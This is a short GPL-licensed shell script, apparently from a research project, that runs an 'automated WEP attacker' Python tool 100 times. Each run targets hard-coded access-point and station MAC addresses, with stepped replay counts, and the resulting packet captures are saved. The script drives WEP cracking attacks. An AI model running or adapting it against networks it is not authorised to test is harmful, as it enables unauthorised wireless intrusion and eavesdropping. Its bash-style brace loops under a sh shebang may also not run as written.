#!/bin/sh
    # Automatic wep cracker
    # Copyright (C) 2021  Tyson Steele, Neilesh Chander, Ryan Kane

    # This program is free software: you can redistribute it and/or modify
    # it under the terms of the GNU General Public License as published by
    # the Free Software Foundation, either version 3 of the License, or
    # (at your option) any later version.

    # This program is distributed in the hope that it will be useful,
    # but WITHOUT ANY WARRANTY; without even the implied warranty of
    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    # GNU General Public License for more details.

for i in {1..20}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 15000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {21..40}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 20000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {41..60}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 25000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {61..80}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 35000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {81..100}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 40000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done